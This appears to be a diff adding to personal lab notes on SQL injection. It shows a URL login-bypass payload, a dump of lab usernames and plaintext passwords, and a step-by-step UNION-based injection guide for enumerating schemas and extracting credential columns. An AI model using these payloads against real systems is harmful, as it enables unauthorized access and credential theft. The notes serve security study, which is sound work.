@@ -253,3 +253,51 @@ Go to inspect > Network > Post > Request > Raw (radio button)
 #at the end of URL, type '? and content from Raw button
 x.x.x.x/login.php?<content from raw button>
 username=%27OR+1%3D%271&passwd=%27OR+1%3D%271 (WHAT YOU PASTE SHOULD LOOK LIKE THIS)
+
+    [0] => Luke_Skywalker
+    [name] => Luke_Skywalker
+    [1] => Jedi
+    [pass] => Jedi
+
+    [0] => Darth_Vader
+    [name] => Darth_Vader
+    [1] => Sith
+    [pass] => Sith
+
+    [0] => c3p0
+    [name] => c3p0
+    [1] => annoying
+    [pass] => annoying
+
+    [0] => Batman
+    [name] => Batman
+    [1] => BWyane
+    [pass] => BWyane
+
+####  SQL INJECTION
+1. Blind Injection (identify vulnerable field)
+- make selection (Audi 'OR 1='1) (Audi 'OR 1='1 #) sometimes you might have to use the octothorpe.
+
+2. Indentify Number of Columns
+- Audi 'UNION SELECT 1,2,3,4, (INITIAL TEST)    
+- Audi 'UNION SELECT 1,2,3,4,5 #               
+####  AGAIN, MAY OR MAY NOT NEED OCTOTHORPE AT THE END.
+
+3. THE GOLDEN STATEMENT
+UNION SELECT column_name,column_name FROM database.table
+Audi' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #
+
+4. Craft Queries
+UNION SELECT column_name,column_name FROM database.table
+Audi' UNION SELECT 1,2,table_schema,4,5 FROM information_schema.columns; #
+Audi' UNION SELECT 1,2,username,passwd,jump FROM session.userinfo; #
+Audi' UNION SELECT 1,2,id,name,pass FROM session.user; #
+
+
+
+
+
+
+
+
+
